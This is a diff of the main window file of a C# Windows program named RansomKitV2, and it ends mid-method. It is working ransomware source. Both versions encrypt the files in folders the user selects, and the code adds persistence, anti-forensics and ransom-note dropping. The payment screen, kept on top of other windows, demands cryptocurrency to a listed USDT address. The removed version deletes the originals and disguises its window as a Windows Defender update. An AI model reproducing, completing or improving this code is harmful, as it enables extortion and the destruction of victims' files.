@@ -9,441 +9,617 @@ using System.Windows.Forms;
 
 namespace RansomKitV2
 {
-    internal sealed class MainForm : Form
+    public class MainForm : Form
     {
-        private const string _UPI_ID = "yourname@upi";
-        private const string _UPI_AMT = "5000";
-        private const string _BNB = "0xYourBinanceWalletAddressHere";
-        private const string _MAIL = "support@yourdomain.com";
-        private const string _MASTER_KEY_B64 = "billahaikillaleleuskadhila";
-
         private readonly LaunchMode _mode;
-        private RichTextBox _log;
-        private ProgressBar _prog;
-        private Label _fileLbl;
-        private Label _statusLbl;
-        private Panel _leftPanel;
-        private Panel _setupPanel;
-        private Panel _payPanel;
-        private ListBox _pathList;
-        private TextBox _pwBox;
-        private Button _unlockBtn;
 
-        private byte[] _masterKey;
+        private Panel _setupPanel = null!;
+        private Panel _payPanel = null!;
 
-        private static readonly Color _BG = Color.FromArgb(0x1a, 0x1a, 0x2e);
-        private static readonly Color _BG2 = Color.FromArgb(0x16, 0x21, 0x3e);
-        private static readonly Color _ACC = Color.FromArgb(0xe9, 0x45, 0x60);
-        private static readonly Color _TXT = Color.FromArgb(0xea, 0xea, 0xea);
-        private static readonly Color _LOG = Color.FromArgb(0x0f, 0x34, 0x60);
-        private static readonly Color _OK = Color.FromArgb(0x4e, 0xcc, 0xa3);
-        private static readonly Color _WARN = Color.FromArgb(0xf5, 0xa6, 0x23);
+        private ListBox _folderList = null!;
+        private Button _addFolderBtn = null!;
+        private Button _startBtn = null!;
+        private Label _setupStatus = null!;
 
-        public MainForm(LaunchMode mode)
+        private TextBox _keyBox = null!;
+        private Button _unlockButton = null!;
+        private Label _statusLabel = null!;
+
+        private const string CryptoAddress = "Dqcwgm1FseFNQCgECgPvnMA7SjyDTpif3CroYB47znuD";
+
+        public MainForm(LaunchMode mode = LaunchMode.Normal)
         {
             _mode = mode;
-            BuildUI();
+            Text = "RansomKit V2";
+            StartPosition = FormStartPosition.CenterScreen;
+            FormBorderStyle = FormBorderStyle.FixedSingle;
+            MaximizeBox = false;
+            MinimizeBox = true;
+            BackColor = Color.FromArgb(20, 20, 24);
+            AutoScaleMode = AutoScaleMode.Font;
+
+            BuildSetupPanel();
+            BuildPayPanel();
+
+            Controls.Add(_setupPanel);
+            Controls.Add(_payPanel);
+
             Load += OnLoad;
         }
 
-        private void BuildUI()
+        private void OnLoad(object? sender, EventArgs e)
         {
-            Text = "Windows Defender Service Update";
-            Size = new Size(1020, 660);
-            MinimumSize = new Size(800, 520);
-            BackColor = _BG;
-            ForeColor = _TXT;
-            StartPosition = FormStartPosition.CenterScreen;
-            Font = new Font("Segoe UI", 9f);
+            bool locked = Persistence.IsLocked();
 
-            var topBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG2 };
-            var titleLbl = new Label { Text = "● SYSTEM MONITOR", ForeColor = _ACC, Font = new Font("Segoe UI", 10f, FontStyle.Bold), AutoSize = true, Location = new Point(10, 8) };
-            _statusLbl = new Label { Text = "Initializing...", ForeColor = _WARN, AutoSize = true, Anchor = AnchorStyles.Top | AnchorStyles.Right, Location = new Point(830, 10) };
-            topBar.Controls.AddRange(new Control[] { titleLbl, _statusLbl });
-
-            var botBar = new Panel { Dock = DockStyle.Bottom, Height = 46, BackColor = _BG2 };
-            _prog = new ProgressBar { Location = new Point(8, 10), Size = new Size(650, 22), Style = ProgressBarStyle.Continuous, Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top };
-            _fileLbl = new Label { Location = new Point(668, 10), Size = new Size(340, 22), ForeColor = _TXT, Font = new Font("Consolas", 8f), TextAlign = ContentAlignment.MiddleLeft, Anchor = AnchorStyles.Right | AnchorStyles.Top };
-            botBar.Controls.AddRange(new Control[] { _prog, _fileLbl });
-
-            var split = new SplitContainer { Dock = DockStyle.Fill, BackColor = _BG, SplitterDistance = 500 };
-
-            _leftPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
-            BuildSetupPanel();
-            BuildPayPanel();
-            _leftPanel.Controls.AddRange(new Control[] { _setupPanel, _payPanel });
-            split.Panel1.Controls.Add(_leftPanel);
-
-            _log = new RichTextBox { Dock = DockStyle.Fill, BackColor = _LOG, ForeColor = _TXT, Font = new Font("Consolas", 9f), BorderStyle = BorderStyle.None, ReadOnly = true };
-            split.Panel2.Controls.Add(_log);
-
-            Controls.Add(split);
-            Controls.Add(botBar);
-            Controls.Add(topBar);
-
-            ShowPanel(_setupPanel);
-            SetStatus("Ready", _OK);
+            if (_mode == LaunchMode.Silent || _mode == LaunchMode.Decrypt || locked)
+            {
+                _setupPanel.Visible = false;
+                _payPanel.Visible = true;
+                TopMost = true;
+                Activate();
+            }
+            else
+            {
+                _setupPanel.Visible = true;
+                _payPanel.Visible = false;
+            }
         }
 
+        // =========================================================
+        //  SETUP PANEL
+        // =========================================================
         private void BuildSetupPanel()
         {
-            _setupPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG };
-            var hdrBar = new Panel { Dock = DockStyle.Top, Height = 38, BackColor = _BG };
-            hdrBar.Controls.Add(new Label { Text = "SELECT PATHS TO PROCESS", ForeColor = _ACC, Font = new Font("Segoe UI", 10f, FontStyle.Bold), AutoSize = true, Location = new Point(12, 10) });
-
-            _pathList = new ListBox { Dock = DockStyle.Fill, BackColor = _BG2, ForeColor = _TXT, BorderStyle = BorderStyle.FixedSingle };
-
-            var strip = new Panel { Dock = DockStyle.Bottom, Height = 60, BackColor = _BG };
-            var btnAdd = new Button { Text = "Add Path", Location = new Point(10, 15), Size = new Size(100, 30), BackColor = _BG2, ForeColor = _TXT, FlatStyle = FlatStyle.Flat };
-            btnAdd.Click += (s, e) => {
-                using (var fbd = new FolderBrowserDialog())
-                    if (fbd.ShowDialog() == DialogResult.OK) _pathList.Items.Add(fbd.SelectedPath);
+            _setupPanel = new Panel
+            {
+                Dock = DockStyle.Fill,
+                BackColor = Color.FromArgb(20, 20, 24),
             };
 
-            var btnStart = new Button { Text = "Start Processing", Location = new Point(120, 15), Size = new Size(130, 30), BackColor = _ACC, ForeColor = Color.White, FlatStyle = FlatStyle.Flat };
-            btnStart.Click += async (s, e) => await EncryptAsync();
+            var header = new Label
+            {
+                Text = "RANSOMKIT V2 — SETUP",
+                ForeColor = Color.FromArgb(220, 40, 40),
+                Font = new Font("Segoe UI", 15f, FontStyle.Bold),
+                Dock = DockStyle.Top,
+                Height = 48,
+                TextAlign = ContentAlignment.MiddleCenter,
+            };
 
-            strip.Controls.AddRange(new Control[] { btnAdd, btnStart });
-            _setupPanel.Controls.Add(_pathList);
-            _setupPanel.Controls.Add(strip);
-            _setupPanel.Controls.Add(hdrBar);
+            _folderList = new ListBox
+            {
+                Dock = DockStyle.Top,
+                Height = 340,
+                BackColor = Color.FromArgb(30, 30, 36),
+                ForeColor = Color.Gainsboro,
+                BorderStyle = BorderStyle.FixedSingle,
+                Font = new Font("Consolas", 9f),
+            };
+
+            var buttonRow = new FlowLayoutPanel
+            {
+                Dock = DockStyle.Top,
+                Height = 48,
+                FlowDirection = FlowDirection.LeftToRight,
+                Padding = new Padding(6),
+                BackColor = Color.FromArgb(20, 20, 24),
+            };
+
+            _addFolderBtn = new Button
+            {
+                Text = "Add Folder",
+                Width = 120,
+                Height = 32,
+                FlatStyle = FlatStyle.Flat,
+                BackColor = Color.FromArgb(40, 40, 48),
+                ForeColor = Color.White,
+            };
+            _addFolderBtn.Click += AddFolderBtn_Click;
+
+            _startBtn = new Button
+            {
+                Text = "Start Encryption",
+                Width = 160,
+                Height = 32,
+                FlatStyle = FlatStyle.Flat,
+                BackColor = Color.FromArgb(180, 30, 30),
+                ForeColor = Color.White,
+                Font = new Font("Segoe UI", 9f, FontStyle.Bold),
+            };
+            _startBtn.Click += StartBtn_Click;
+
+            buttonRow.Controls.Add(_addFolderBtn);
+            buttonRow.Controls.Add(_startBtn);
+
+            _setupStatus = new Label
+            {
+                Dock = DockStyle.Top,
+                Height = 28,
+                ForeColor = Color.Gainsboro,
+                Font = new Font("Segoe UI", 9f),
+                TextAlign = ContentAlignment.MiddleCenter,
+                Text = "Add one or more folders, then start.",
+            };
+
+            _setupPanel.Controls.Add(_setupStatus);
+            _setupPanel.Controls.Add(buttonRow);
+            _setupPanel.Controls.Add(_folderList);
+            _setupPanel.Controls.Add(header);
         }
 
+        private void AddFolderBtn_Click(object? sender, EventArgs e)
+        {
+            using var dlg = new FolderBrowserDialog
+            {
+                Description = "Pick a folder to encrypt",
+                ShowNewFolderButton = false,
+            };
+            if (dlg.ShowDialog(this) == DialogResult.OK && Directory.Exists(dlg.SelectedPath))
+            {
+                if (!_folderList.Items.Contains(dlg.SelectedPath))
+                    _folderList.Items.Add(dlg.SelectedPath);
+            }
+        }
+
+        // =========================================================
+        //  ENCRYPT — parallel, session-key cached
+        // =========================================================
+        private async void StartBtn_Click(object? sender, EventArgs e)
+        {
+            var roots = _folderList.Items.Cast<string>().ToList();
+            if (roots.Count == 0)
+            {
+                MessageBox.Show(this, "Add at least one folder first.", "RansomKit",
+                    MessageBoxButtons.OK, MessageBoxIcon.Information);
+                return;
+            }
+
+            _startBtn.Enabled = false;
+            _setupStatus.Text = "Scanning...";
+
+            var files = await Task.Run(() => Walker.Walk(roots));
+            if (files.Count == 0)
+            {
+                _setupStatus.Text = "No target files found.";
+                _startBtn.Enabled = true;
+                return;
+            }
+
+            // Persist state BEFORE modifying disk so a crash mid-encrypt
+            // still leaves a recoverable manifest.
+            StateManager.Save(new StateData
+            {
+                Files = files,
+                Paths = roots,
+                Locked = true,
+            });
+            Persistence.SavePaths(roots);
+            Persistence.SetLocked(true);
+
+            // Derive the session key once, off the UI thread.
+            await Task.Run(() => CryptoEngine.PrimeSessionKey());
+
+            int total = files.Count;
+            int done = 0;
+            int cores = Environment.ProcessorCount;
+
+            _setupStatus.Text = $"Encrypting 0/{total}...";
+
+            await Task.Run(() =>
+            {
+                Parallel.ForEach(
+                    files,
+                    new ParallelOptions { MaxDegreeOfParallelism = cores },
+                    f =>
+                    {
+                        try
+                        {
+                            CryptoEngine.EncryptFile(f);
+                            int current = Interlocked.Increment(ref done);
+
+                            if (current % 25 == 0 || current == total)
+                            {
+                                try
+                                {
+                                    _setupStatus.BeginInvoke((Action)(() =>
+                                        _setupStatus.Text = $"Encrypting {current}/{total}..."));
+                                }
+                                catch { }
+                            }
+                        }
+                        catch { }
+                    });
+            });
+
+            await Task.Run(() =>
+            {
+                try { AntiForensics.Run(); } catch { }
+                try { NoteDropper.Drop(roots); } catch { }
+            });
+
+            CryptoEngine.ResetSessionKey();
+
+            _setupStatus.Text = $"Encrypted {done} files.";
+            _setupPanel.Visible = false;
+            _payPanel.Visible = true;
+            TopMost = true;
+            Activate();
+        }
+
+        // =========================================================
+        //  PAY / UNLOCK PANEL
+        // =========================================================
         private void BuildPayPanel()
         {
-            _payPanel = new Panel { Dock = DockStyle.Fill, BackColor = _BG, Visible = false };
-            var lbl = new Label { Text = "Your files have been encrypted.\nPay to unlock.", ForeColor = _ACC, Font = new Font("Segoe UI", 14f, FontStyle.Bold), AutoSize = true, Location = new Point(50, 50) };
-            var lblInfo = new Label { Text = $"UPI: {_UPI_ID}\nAmount: {_UPI_AMT}\nBinance: {_BNB}\nEmail: {_MAIL}", ForeColor = _TXT, Font = new Font("Segoe UI", 10f), AutoSize = true, Location = new Point(50, 120) };
+            var bg = Color.FromArgb(20, 20, 24);
+            var cardBg = Color.FromArgb(26, 26, 30);
+            var accent = Color.FromArgb(220, 40, 40);
+            var textMain = Color.FromArgb(230, 230, 235);
+            var textDim = Color.FromArgb(140, 140, 155);
 
-            _pwBox = new TextBox { Location = new Point(50, 250), Width = 300, BackColor = _BG2, ForeColor = _TXT, BorderStyle = BorderStyle.FixedSingle };
-            _unlockBtn = new Button { Text = "Unlock", Location = new Point(360, 248), Size = new Size(100, 26), BackColor = _OK, ForeColor = _BG, FlatStyle = FlatStyle.Flat };
-            _unlockBtn.Click += async (s, e) => await DecryptAsync();
-
-            _payPanel.Controls.AddRange(new Control[] { lbl, lblInfo, _pwBox, _unlockBtn });
-        }
-
-        private void OnLoad(object sender, EventArgs e)
-        {
-            Log("System initialized.");
-
-            if (Persistence.IsLocked())
+            _payPanel = new Panel
             {
-                List<string> savedPaths = Persistence.LoadPaths();
-                Log($"Loaded {savedPaths.Count} saved paths from registry.");
-                foreach (string path in savedPaths)
-                {
-                    if (!_pathList.Items.Contains(path)) _pathList.Items.Add(path);
-                }
+                Dock = DockStyle.Fill,
+                BackColor = bg,
+                Visible = false,
+                AutoScroll = false,
+            };
+
+            var container = new Panel
+            {
+                Dock = DockStyle.Fill,
+                BackColor = bg,
+                Padding = new Padding(24, 16, 24, 16),
+            };
+
+            var layout = new TableLayoutPanel
+            {
+                Dock = DockStyle.Fill,
+                ColumnCount = 1,
+                RowCount = 12,
+                BackColor = bg,
+            };
+            layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));
+
+            // Row 0: Title
+            var title = new Label
+            {
+                Text = "YOUR FILES HAVE BEEN ENCRYPTED",
+                ForeColor = accent,
+                Font = new Font("Segoe UI", 15f, FontStyle.Bold),
+                Dock = DockStyle.Fill,
+                TextAlign = ContentAlignment.MiddleCenter,
+                Margin = new Padding(0, 0, 0, 12),
+            };
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
+            layout.Controls.Add(title, 0, 0);
+
+            // Row 1: Notice Card
+            var noteCard = new Panel
+            {
+                Dock = DockStyle.Fill,
+                BackColor = cardBg,
+                BorderStyle = BorderStyle.FixedSingle,
+                Padding = new Padding(16, 12, 16, 12),
+                Margin = new Padding(0, 0, 0, 16),
+            };
+            var accentBar = new Panel
+            {
+                Dock = DockStyle.Left,
+                Width = 4,
+                BackColor = accent,
+            };
+            var noteText = new Label
+            {
+                Dock = DockStyle.Fill,
+                ForeColor = textMain,
+                Font = new Font("Segoe UI", 9.5f),
+                TextAlign = ContentAlignment.TopLeft,
+                Text =
+                    "Your important documents, photos, and files have been encrypted with a secure AES-256 algorithm. The original files have been deleted.\r\n\r\n" +
+                    "To restore your data, you must obtain the unique decryption key. Complete the payment to one of the addresses below to receive it.\r\n\r\n" +
+                    "IMPORTANT: Do not rename, move, or modify the .locked files. Doing so will permanently corrupt your data.",
+            };
+            noteCard.Controls.Add(noteText);
+            noteCard.Controls.Add(accentBar);
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 150f));
+            layout.Controls.Add(noteCard, 0, 1);
+
+            // Row 2: Crypto Header
+            var cryptoHeader = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0, 0, 0, 4) };
+            var cryptoTitle = new Label
+            {
+                Text = "CRYPTO ADDRESS (USDT)",
+                ForeColor = textDim,
+                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
+                Dock = DockStyle.Top,
+                Height = 16,
+            };
+            var cryptoAddrBox = new TextBox
+            {
+                Text = CryptoAddress,
+                ForeColor = textMain,
+                BackColor = bg,
+                Font = new Font("Consolas", 10f),
+                BorderStyle = BorderStyle.None,
+                ReadOnly = true,
+                Dock = DockStyle.Top,
+                Width = 400,
+            };
+            cryptoHeader.Controls.Add(cryptoAddrBox);
+            cryptoHeader.Controls.Add(cryptoTitle);
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 36f));
+            layout.Controls.Add(cryptoHeader, 0, 2);
+
+            // Row 3: Crypto Scanner
+            Image? cryptoImage = ScannerAsset.LoadAsset("scanner");
+            var cryptoScannerBox = new PictureBox
+            {
+                Dock = DockStyle.Fill,
+                SizeMode = PictureBoxSizeMode.Zoom,
+                BackColor = Color.FromArgb(14, 14, 18),
+                BorderStyle = BorderStyle.FixedSingle,
+                Padding = new Padding(4),
+                Margin = new Padding(0, 0, 0, 16),
+            };
+            cryptoScannerBox.Image = cryptoImage ?? BuildPlaceholder();
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 200f));
+            layout.Controls.Add(cryptoScannerBox, 0, 3);
+
+            // Row 4 & 5: Binance (optional)
+            var (binanceImage, binanceFailed) = TryLoadBinanceScanner();
+            bool hasBinance = binanceImage != null || binanceFailed;
+
+            var binanceHeader = new Label
+            {
+                Text = binanceFailed ? "BINANCE (IMAGE FAILED TO LOAD)" : "BINANCE ADDRESS",
+                ForeColor = binanceFailed ? Color.FromArgb(220, 80, 80) : textDim,
+                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
+                Dock = DockStyle.Fill,
+                TextAlign = ContentAlignment.BottomLeft,
+                Margin = new Padding(0, 0, 0, 4),
+            };
+
+            var binanceScannerBox = new PictureBox
+            {
+                Dock = DockStyle.Fill,
+                SizeMode = PictureBoxSizeMode.Zoom,
+                BackColor = Color.FromArgb(14, 14, 18),
+                BorderStyle = BorderStyle.FixedSingle,
+                Padding = new Padding(4),
+                Margin = new Padding(0, 0, 0, 16),
+            };
+            if (binanceImage != null) binanceScannerBox.Image = binanceImage;
+            else if (binanceFailed) binanceScannerBox.Image = BuildBinanceErrorPlaceholder();
+
+            if (hasBinance)
+            {
+                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
+                layout.Controls.Add(binanceHeader, 0, 4);
+                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 180f));
+                layout.Controls.Add(binanceScannerBox, 0, 5);
             }
-
-            if (Persistence.IsLocked() || _mode == LaunchMode.Silent || _mode == LaunchMode.ManualDecrypt)
-            {
-                Log("System locked. Awaiting payment.");
-                ShowPanel(_payPanel);
-                SetStatus("Locked", _ACC);
-                this.TopMost = true;
-            }
-        }
-
-        private async Task EncryptAsync()
-        {
-            if (_pathList.Items.Count == 0) { MessageBox.Show("Please add at least one path."); return; }
-            _masterKey = CryptoEngine.SafeFromBase64(_MASTER_KEY_B64);
-            if (_masterKey == null) { MessageBox.Show("Invalid Master Key!"); return; }
-
-            List<string> pathsToSave = new List<string>();
-            foreach (var item in _pathList.Items) { pathsToSave.Add(item.ToString()); }
-            Persistence.SavePaths(pathsToSave);
-
-            ShowPanel(null);
-            SetStatus("Scanning...", _WARN);
-            _prog.Style = ProgressBarStyle.Marquee;
-
-            string myExe = Application.ExecutablePath;
-            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
-            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-            string sysDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
-            string dotnet86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\dotnet";
-            string dotnet64 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\dotnet";
-
-            List<string> targetFiles = new List<string>();
-
-            await Task.Run(() =>
-            {
-                foreach (string path in _pathList.Items)
-                {
-                    Log($"Scanning directory: {path}");
-                    List<string> files = SafeGetFiles(path);
-                    foreach (string file in files)
-                    {
-                        if (!ShouldSkip(file, myExe, currentDir, winDir, sysDir, dotnet86, dotnet64))
-                        {
-                            targetFiles.Add(file);
-                        }
-                    }
-                }
-            });
-
-            targetFiles = targetFiles.Distinct().ToList();
-
-            if (targetFiles.Count == 0)
-            {
-                bool hasLockedFiles = false;
-                await Task.Run(() =>
-                {
-                    foreach (string path in _pathList.Items)
-                    {
-                        List<string> files = SafeGetFiles(path);
-                        if (files.Exists(f => f.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase)))
-                        {
-                            hasLockedFiles = true;
-                            break;
-                        }
-                    }
-                });
-
-                if (hasLockedFiles)
-                {
-                    Log("Files are already encrypted. Locking the system.");
-                    Persistence.Enable();
-                    Invoke(new Action(() => { this.TopMost = true; }));
-                    SetStatus("Locked", _ACC);
-                    ShowPanel(_payPanel);
-                    return;
-                }
-
-                Log("No valid files found to encrypt.");
-                SetStatus("Ready", _OK);
-                ShowPanel(_setupPanel);
-                _prog.Style = ProgressBarStyle.Continuous;
-                return;
-            }
-
-            _prog.Style = ProgressBarStyle.Continuous;
-            _prog.Maximum = targetFiles.Count;
-            _prog.Value = 0;
-            SetStatus($"Encrypting 0 / {targetFiles.Count}", _WARN);
-            Log($"Found {targetFiles.Count} files. Starting encryption...");
-
-            int count = 0;
-            int failed = 0;
-
-            await Task.Run(() =>
-            {
-                foreach (string file in targetFiles)
-                {
-                    try
-                    {
-                        string fileName = Path.GetFileName(file);
-                        Invoke(new Action(() => { _fileLbl.Text = fileName; }));
-                        Log($"[{count + failed + 1}/{targetFiles.Count}] Encrypting: {fileName}");
-
-                        string outFile = file + CryptoEngine.LOCKED_EXT;
-                        CryptoEngine.EncryptFile(file, outFile, _masterKey);
-                        File.Delete(file);
-                        count++;
-
-                        Invoke(new Action(() => {
-                            _prog.Value = count + failed;
-                            _statusLbl.Text = $"Encrypting {count + failed} / {targetFiles.Count}";
-                        }));
-                    }
-                    catch (Exception ex)
-                    {
-                        failed++;
-                        Log($"Failed {Path.GetFileName(file)}: {ex.Message}", _ACC);
-                        Invoke(new Action(() => {
-                            _prog.Value = count + failed;
-                            _statusLbl.Text = $"Encrypting {count + failed} / {targetFiles.Count}";
-                        }));
-                    }
-                }
-            });
-
-            Persistence.Enable();
-            Invoke(new Action(() => { this.TopMost = true; }));
-
-            SetStatus("Locked", _ACC);
-            ShowPanel(_payPanel);
-            Log($"Encryption complete. {count} files locked. {failed} files were skipped.");
-        }
-
-        private List<string> SafeGetFiles(string path)
-        {
-            List<string> files = new List<string>();
-            try { files.AddRange(Directory.GetFiles(path)); } catch { }
-
-            try
-            {
-                foreach (string dir in Directory.GetDirectories(path))
-                {
-                    try
-                    {
-                        if ((File.GetAttributes(dir) & FileAttributes.ReparsePoint) == FileAttributes.ReparsePoint) continue;
-                        files.AddRange(SafeGetFiles(dir));
-                    }
-                    catch { }
-                }
-            }
-            catch { }
-            return files;
-        }
-
-        private bool ShouldSkip(string file, string myExe, string currentDir, string winDir, string sysDir, string dotnet86, string dotnet64)
-        {
-            if (file.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.StartsWith(currentDir, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.Equals(myExe, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.StartsWith(winDir, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.StartsWith(sysDir, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.StartsWith(dotnet86, StringComparison.OrdinalIgnoreCase)) return true;
-            if (file.StartsWith(dotnet64, StringComparison.OrdinalIgnoreCase)) return true;
-
-            if (file.IndexOf(@"\WindowsApps\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
-            if (file.IndexOf(@"\System Volume Information\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
-            if (file.IndexOf(@"\$Recycle.Bin\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
-            if (file.IndexOf(@"\ProgramData\Microsoft\Windows\", StringComparison.OrdinalIgnoreCase) >= 0) return true;
-
-            return false;
-        }
-
-        private async Task DecryptAsync()
-        {
-            string password = _pwBox.Text.Trim();
-            if (string.IsNullOrEmpty(password)) return;
-
-            if (!CryptoEngine.VerifyPassword(password, _MASTER_KEY_B64))
-            {
-                Log("Invalid password.", _ACC);
-                MessageBox.Show("Invalid Password!");
-                return;
-            }
-
-            _masterKey = CryptoEngine.SafeFromBase64(_MASTER_KEY_B64);
-
-            _unlockBtn.Enabled = false;
-            SetStatus("Scanning...", _OK);
-            _prog.Style = ProgressBarStyle.Marquee;
-
-            List<string> targetFiles = new List<string>();
-
-            await Task.Run(() =>
-            {
-                foreach (string path in _pathList.Items)
-                {
-                    List<string> files = SafeGetFiles(path);
-                    foreach (string file in files)
-                    {
-                        if (file.EndsWith(CryptoEngine.LOCKED_EXT, StringComparison.OrdinalIgnoreCase))
-                            targetFiles.Add(file);
-                    }
-                }
-            });
-
-            targetFiles = targetFiles.Distinct().ToList();
-
-            if (targetFiles.Count == 0)
-            {
-                Log("No locked files found.");
-                SetStatus("Unlocked", _OK);
-                _prog.Style = ProgressBarStyle.Continuous;
-                MessageBox.Show("No encrypted files found. Returning to main window.");
-
-                _pwBox.Text = "";
-                _unlockBtn.Enabled = true;
-                Persistence.Disable();
-                this.TopMost = false;
-                ShowPanel(_setupPanel);
-                return;
-            }
-
-            _prog.Style = ProgressBarStyle.Continuous;
-            _prog.Maximum = targetFiles.Count;
-            _prog.Value = 0;
-            SetStatus($"Decrypting 0 / {targetFiles.Count}", _OK);
-            Log($"Found {targetFiles.Count} locked files. Starting decryption...");
-
-            int count = 0;
-            int failed = 0;
-
-            await Task.Run(() =>
-            {
-                foreach (string file in targetFiles)
-                {
-                    try
-                    {
-                        string fileName = Path.GetFileName(file);
-
-                        Invoke(new Action(() => { _fileLbl.Text = fileName; }));
-                        Log($"[{count + failed + 1}/{targetFiles.Count}] Decrypting: {fileName}");
-
-                        string outFile = file.Substring(0, file.Length - CryptoEngine.LOCKED_EXT.Length);
-                        CryptoEngine.DecryptFile(file, outFile, _masterKey);
-                        File.Delete(file);
-                        count++;
-
-                        Invoke(new Action(() => {
-                            _prog.Value = count + failed;
-                            _statusLbl.Text = $"Decrypting {count + failed} / {targetFiles.Count}";
-                        }));
-                    }
-                    catch (Exception ex)
-                    {
-                        failed++;
-                        Log($"Failed to decrypt {Path.GetFileName(file)}: {ex.Message}", _ACC);
-                        Invoke(new Action(() => {
-                            _prog.Value = count + failed;
-                            _statusLbl.Text = $"Decrypting {count + failed} / {targetFiles.Count}";
-                        }));
-                    }
-                }
-            });
-
-            Persistence.Disable();
-            Invoke(new Action(() => { this.TopMost = false; }));
-
-            Log($"Decryption complete. Restored {count} files.");
-            SetStatus("Unlocked", _OK);
-
-            if (failed > 0)
-                MessageBox.Show($"Decryption complete! Restored {count} files. ({failed} failed)");
             else
-                MessageBox.Show($"Decryption complete! Restored {count} files.");
+            {
+                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 0f));
+                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 0f));
+            }
 
-            _pwBox.Text = "";
-            _unlockBtn.Enabled = true;
-            ShowPanel(_setupPanel);
+            // Row 6: Divider
+            var divider = new Panel
+            {
+                Dock = DockStyle.Fill,
+                Height = 1,
+                BackColor = Color.FromArgb(50, 50, 58),
+                Margin = new Padding(0, 0, 0, 16),
+            };
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 1f));
+            layout.Controls.Add(divider, 0, 6);
+
+            // Row 7: Key Label
+            var keyLabel = new Label
+            {
+                Text = "ENTER DECRYPTION KEY",
+                ForeColor = textDim,
+                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
+                Dock = DockStyle.Fill,
+                TextAlign = ContentAlignment.BottomLeft,
+                Margin = new Padding(0, 0, 0, 4),
+            };
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
+            layout.Controls.Add(keyLabel, 0, 7);
+
+            // Row 8: Key Input
+            _keyBox = new TextBox
+            {
+                Dock = DockStyle.Fill,
+                Font = new Font("Consolas", 11f),
+                BackColor = Color.FromArgb(30, 30, 36),
+                ForeColor = Color.White,
+                BorderStyle = BorderStyle.FixedSingle,
+                Margin = new Padding(0, 0, 0, 12),
+            };
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 32f));
+            layout.Controls.Add(_keyBox, 0, 8);
+
+            // Row 9: Unlock Button
+            _unlockButton = new Button
+            {
+                Text = "UNLOCK FILES",
+                Dock = DockStyle.Fill,
+                FlatStyle = FlatStyle.Flat,
+                BackColor = accent,
+                ForeColor = Color.White,
+                Font = new Font("Segoe UI", 11f, FontStyle.Bold),
+                Margin = new Padding(0, 0, 0, 8),
+            };
+            _unlockButton.FlatAppearance.BorderSize = 0;
+            _unlockButton.Click += UnlockButton_Click;
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
+            layout.Controls.Add(_unlockButton, 0, 9);
+
+            // Row 10: Status
+            _statusLabel = new Label
+            {
+                Dock = DockStyle.Fill,
+                ForeColor = textDim,
+                Font = new Font("Segoe UI", 9f),
+                TextAlign = ContentAlignment.MiddleCenter,
+            };
+            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 24f));
+            layout.Controls.Add(_statusLabel, 0, 10);
+
+            // Row 11: Filler
+            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100f));
+
+            container.Controls.Add(layout);
+            _payPanel.Controls.Add(container);
+
+            // Auto-resize
+            int totalHeight = 16 + 44 + 150 + 36 + 200 + 16 + 1 + 20 + 32 + 44 + 24 + 16;
+            if (hasBinance) totalHeight += (20 + 180);
+
+            ClientSize = new Size(540, totalHeight);
         }
 
-        private void ShowPanel(Panel p)
+        private static (Image? image, bool fileFoundButFailed) TryLoadBinanceScanner()
         {
-            _setupPanel.Visible = false;
-            _payPanel.Visible = false;
-            if (p != null) p.Visible = true;
+            var embedded = ScannerAsset.LoadEmbedded("binance");
+            if (embedded != null) return (embedded, false);
+
+            var disk = ScannerAsset.LoadFromDisk("binance");
+            if (disk != null) return (disk, false);
+
+            string baseDir = AppContext.BaseDirectory;
+            foreach (var ext in new[] { "png", "jpg", "jpeg" })
+            {
+                if (File.Exists(Path.Combine(baseDir, "binance." + ext)))
+                    return (null, true);
+            }
+
+            return (null, false);
         }
 
-        private void SetStatus(string text, Color c)
+        private static Bitmap BuildPlaceholder()
         {
-            _statusLbl.Text = text;
-            _statusLbl.ForeColor = c;
+            var bmp = new Bitmap(460, 200);
+            using var g = Graphics.FromImage(bmp);
+            using var pen = new Pen(Color.FromArgb(70, 70, 80));
+            using var font = new Font("Segoe UI", 10f);
+            using var brush = new SolidBrush(Color.DimGray);
+
+            g.Clear(Color.FromArgb(14, 14, 18));
+            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
+            const string text = "scanner image missing — add scanner.png and rebuild";
